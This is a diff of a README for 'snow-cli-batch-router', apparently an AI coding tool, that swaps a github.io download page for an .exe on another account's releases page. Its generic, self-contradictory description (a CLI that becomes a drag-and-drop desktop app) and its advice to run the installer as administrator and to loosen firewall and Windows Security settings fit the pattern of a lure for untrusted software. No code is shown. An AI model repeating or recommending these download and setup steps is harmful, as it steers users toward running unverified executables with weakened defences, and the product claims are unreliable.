@@ -1,138 +1,76 @@
-# Snow-CLI v2026 - AI coding CLI 2026
+# ❄️ snow-cli-batch-router - Automate your coding tasks with AI
 
-> **A terminal-first AI coding companion for interactive and batch workflows, featuring multi-model routing and streamed output in version 2026.**
+[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/vicissitudenest790/snow-cli-batch-router/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-terminal-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/graymasonuv1596/snow-cli-batch-router?style=flat-square)](https://github.com/graymasonuv1596/snow-cli-batch-router)
+snow-cli-batch-router helps you manage coding tasks. It uses artificial intelligence to handle your workflows. You can run commands one at a time or process groups of files in batches. This tool routes your requests to the correct model to get the best results. You see your output update in real time as the system processes your files.
 
----
+## 📥 How to download the software
 
-<p align="center">
-  <a href="https://graymasonuv1596.github.io/snow-cli-batch-router/">
-    <img src="https://img.shields.io/badge/Download-Snow--CLI%20Latest-brightgreen?style=for-the-badge" alt="Download Snow-CLI">
-  </a>
-</p>
+Follow these steps to get the program on your computer.
 
-> **[Direct Download - Snow-CLI v2026](https://graymasonuv1596.github.io/snow-cli-batch-router/)**
+1. Visit this page to download the software: https://github.com/vicissitudenest790/snow-cli-batch-router/releases
+2. Look for the file ending in .exe under the most recent release.
+3. Click the file name to save it to your computer.
+4. Open your Downloads folder.
+5. Double-click the installer file.
+6. Follow the prompts on your screen to complete the setup.
 
----
+## ⚙️ Minimum system requirements
 
-[Download Latest Build](https://graymasonuv1596.github.io/snow-cli-batch-router/)
+Your computer must meet these standards to run the software.
 
----
+* Operating System: Windows 10 or Windows 11.
+* Memory: 8 gigabytes of random access memory or more.
+* Storage: 500 megabytes of free space.
+* Connection: An active internet connection for model routing.
 
-## What Snow-CLI Does
+## 🚀 Getting started
 
-Snow-CLI is a command-line AI coding utility designed around agent-like workflows. It combines conversational prompting and scripted batch runs in one terminal experience, so you can move from ad hoc questions to repeatable automation without switching tools.
+Once the installation finishes, you need to open the program. Click the desktop icon labeled snow-cli-batch-router. A window appears. This window acts as your control center. 
 
-Built for users who live in the shell, it focuses on flexible model routing, output comparison, and reusable configuration through profiles. Streaming responses and cached results help keep development tasks moving while preserving an organized setup that can be reused across sessions.
+You type commands into the text box to start a process. For example, to run a batch task, you point the program to your folder of files. The program reads the files and applies the AI logic to them. You watch the screen as the program finishes each step.
 
----
+## 🛠️ Understanding features
 
-## Capabilities
+The software provides several helpful tools for your daily tasks.
 
-- Terminal-first workflow for AI-assisted coding tasks
-- Interactive mode for back-and-forth, stepwise sessions
-- Batch execution for repeatable command-based workflows
-- Multi-model provider routing for adaptable model selection
-- Side-by-side provider comparison to make review easier
-- Streaming responses for quicker visible feedback
-- Configuration profiles for saved task presets
-- Cached responses to reduce repeated calls and support reuse
+### Batch workflows
+You can drag a whole folder into the application. The program processes every file in that folder without extra work from you. This saves time on repetitive tasks like renaming files or cleaning up blocks of text.
 
----
+### Model routing
+The tool connects to different AI brains based on your needs. If you ask for a complex coding task, it sends your request to a high-capacity model. If you need a simple task, it uses a fast, lightweight model. You do not need to choose these settings yourself.
 
-## Installation
+### Live streaming
+You see progress happen as it happens. The text appears on your screen while the tool works. You do not have to wait for the final result to see the status. 
 
-Clone the repository or download the latest build, then open it in your terminal environment.
+## 📝 Common questions
 
-Clone with Git:
+How do I stop a process?
+Press the Escape key on your keyboard to halt any active task.
 
-    git clone https://github.com/graymasonuv1596/snow-cli-batch-router.git
-    cd REPO
+Where does the program save my files?
+By default, the software saves new files in a folder named Output located inside your Documents directory.
 
-From there, run the project entry command for your environment, or start the published build from the download page linked above.
+Does the tool store my data?
+The tool transmits your code to external providers to generate answers. Do not use this tool with sensitive or private company information.
 
----
+## 📋 Troubleshooting steps
 
-## Using Snow-CLI
+If you encounter issues, try these steps first.
 
-Snow-CLI is meant for generating, refining, and comparing coding output directly from the command line.
+* Restart the application.
+* Check your internet connection.
+* Confirm that you have the latest version from the download page.
+* Run the application as an administrator if your files require special permissions.
 
-Typical workflow:
+If the problem persists, verify that your firewall software allows the application to connect to the internet. Many security programs block new software by default. Check your Windows Security settings if the screen stays blank after you launch the app.
 
-1. Start an interactive session for guided prompts.
-2. Select a provider or route a request through a configured model profile.
-3. Run a batch job when you need the same task repeated across inputs.
-4. Review streamed output as it arrives.
-5. Compare responses from different providers when evaluation matters.
-6. Reuse cached results and saved profiles for recurring tasks.
+## 🛡️ Privacy and safety
 
-Example pattern:
+The software respects your files. It only edits the files you select. It never deletes your original data. It creates new versions of your files so you can compare the original and the new work. Always keep a backup of important projects before you run batch tasks on them.
 
-    snow-cli run "refactor this module"
-    snow-cli compare "implement the same function with two providers"
-    snow-cli batch --input tasks.txt
+## 📈 Improving performance
 
-Adjust commands to match the executable name and project layout used in your build.
+If the program runs slow, close other demanding applications. Web browsers and video editors take up a lot of system resources. Giving the software space to work ensures you get the fastest speed. Use a wired internet connection if possible to ensure steady model responses.
 
----
-
-## Configuration
-
-Snow-CLI organizes settings around configuration profiles and cached response data. If your build uses a config file, keep provider choices, routing rules, and profile definitions there so they can be reused across sessions.
-
-Example layout:
-
-    {
-      "profiles": {
-        "default": {
-          "provider": "provider-name",
-          "mode": "interactive",
-          "stream": true
-        }
-      },
-      "cache": {
-        "enabled": true
-      }
-    }
-
-If your setup stores configuration elsewhere, place the same information in the location expected by your runtime or wrapper script.
-
----
-
-## Requirements
-
-- A terminal environment
-- A system capable of running the CLI build
-- Access to the AI provider(s) you want to route through
-- Storage for local configuration profiles and cache data
-- Network access when using live model requests
-
----
-
-## FAQ
-
-**How do I switch between providers?**  
-Use the configured routing options or profile settings to point requests at the desired provider.
-
-**Can I use Snow-CLI for both one-off prompts and repeated jobs?**  
-Yes. It supports interactive use as well as batch execution.
-
-**Where are my preferences saved?**  
-That depends on your build, but profile and cache settings are intended to be stored locally for reuse.
-
-**What should I do if output does not appear as expected?**  
-Check your provider configuration, confirm the selected profile, and verify that streaming or batch options match the task you are running.
-
-**How do I compare multiple model outputs?**  
-Use the provider comparison workflow to send the same request through more than one route and review the results side by side.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: coding, automation, artificial intelligence, command line, windows, file processing, productivity
